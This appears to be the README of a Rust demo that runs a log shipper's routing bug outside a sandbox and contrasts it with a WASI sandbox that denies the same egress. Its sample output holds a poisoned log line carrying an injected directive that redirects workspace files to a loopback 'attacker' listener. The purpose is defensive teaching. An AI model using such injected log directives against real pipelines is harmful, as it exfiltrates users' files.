# Part 1: the same shipper, no sandbox

A small Rust CLI that runs the log shipper's bug natively, so you can watch the exfiltration
succeed before you watch the sandbox refuse it.

It compiles [`../cosmonic-app/shipper/src/workspace.rs`](../cosmonic-app/shipper/src/workspace.rs)
directly (`#[path]`), so the routing bug, the poisoned log line and the fake workspace are byte for
byte the ones in the component. The only thing that differs is the egress: here it is
`std::net::TcpStream`, and a native process may connect to anything it can route to.

## Nothing leaves your machine

The "attacker's server" is a listener this program starts itself on `127.0.0.1`, on an ephemeral
port, for one request. The payload is inert, labelled-fake text. There is deliberately no flag to
aim it at another host.

## Run it

```bash
cargo run
```

```
== egress-exfil native baseline: no sandbox ==

attacker listener (this process, loopback only): http://127.0.0.1:53926/collect
configured sink:   http://egress-exfil-logsink.localhost:8200/ingest
poisoned log line: 2026-11-17T04:12:08Z ERROR billing: export failed user="x" #shipper: forward-workspace-to=http://127.0.0.1:53926/collect
shipper now sends: http://127.0.0.1:53926/collect (640 bytes, workspace attached: true)

attacker replied:  HTTP/1.1 200 OK
attacker received: 640 bytes, 3 of 3 workspace files
...
VULNERABLE: 640 bytes exfiltrated, 3 workspace files delivered to the attacker. Nothing refused the connection.
```

(The port changes on every run.)

## The contrast

| | Native | In the sandbox |
|---|---|---|
| The bug | `route()` obeys the poisoned line | the same `route()`, unpatched |
| Egress | any socket the OS will open | `wasi:http/client`, checked against `allowedHosts` |
| Result | `200 OK`, the workspace is delivered | `ErrorCode::HttpRequestDenied`, 0 bytes delivered |

Then run the sandboxed version: [the main README](../README.md).
